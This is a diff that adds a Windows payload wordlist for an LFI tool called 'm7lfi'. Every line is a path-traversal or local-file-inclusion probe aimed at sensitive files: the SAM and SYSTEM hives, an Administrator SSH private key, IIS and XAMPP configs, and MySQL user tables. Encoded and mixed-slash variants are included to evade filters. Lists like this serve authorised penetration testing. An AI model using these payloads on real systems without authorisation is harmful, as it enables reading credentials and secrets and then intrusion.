@@ -1,0 +1,65 @@
+# m7lfi - Windows Specific Payloads
+# Milkyway Intelligence | Sharlix
+
+# System files
+C:/Windows/win.ini
+C:/Windows/system.ini
+C:/Windows/System32/drivers/etc/hosts
+C:/Windows/System32/config/SAM
+C:/Windows/System32/config/SYSTEM
+C:/Windows/repair/SAM
+C:/Windows/repair/system
+C:/boot.ini
+C:/Windows/debug/NetSetup.log
+C:/Windows/WindowsUpdate.log
+C:/Windows/iis5.log
+C:/Windows/iis6.log
+
+# IIS
+C:/Windows/System32/inetsrv/config/applicationHost.config
+C:/inetpub/wwwroot/web.config
+C:/inetpub/logs/LogFiles/W3SVC1/
+C:/inetpub/wwwroot/global.asa
+
+# Backslash variants
+C:\Windows\win.ini
+C:\Windows\system.ini
+C:\boot.ini
+C:\Windows\System32\config\SAM
+..\Windows\win.ini
+..\..\Windows\win.ini
+..\..\..\Windows\win.ini
+..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\..\Windows\win.ini
+
+# URL encoded backslash
+..%5cWindows%5cwin.ini
+..%5c..%5cWindows%5cwin.ini
+..%5c..%5c..%5cWindows%5cwin.ini
+..%5c..%5c..%5c..%5cWindows%5cwin.ini
+..%5c..%5c..%5c..%5c..%5cWindows%5cwin.ini
+
+# Double encoded backslash
+..%255cWindows%255cwin.ini
+..%255c..%255cWindows%255cwin.ini
+
+# Mixed slash
+../\../\Windows/win.ini
+..\/../\Windows\win.ini
+
+# Environment and system info
+C:/Windows/System32/cmd.exe
+C:/Windows/System32/systeminfo.exe
+C:/Users/Administrator/Desktop/
+C:/Users/Administrator/.ssh/id_rsa
+C:/ProgramData/
+C:/Program Files/
+
+# Common web app configs on Windows
+C:/inetpub/wwwroot/web.config
+C:/xampp/apache/conf/httpd.conf
+C:/xampp/mysql/data/mysql/user.MYD
+C:/xampp/FileZillaFTP/FileZilla Server.xml
+C:/xampp/php/php.ini
+C:/wamp/www/web.config
+C:/wamp64/bin/mysql/mysql5.7.19/data/mysql/user.MYD
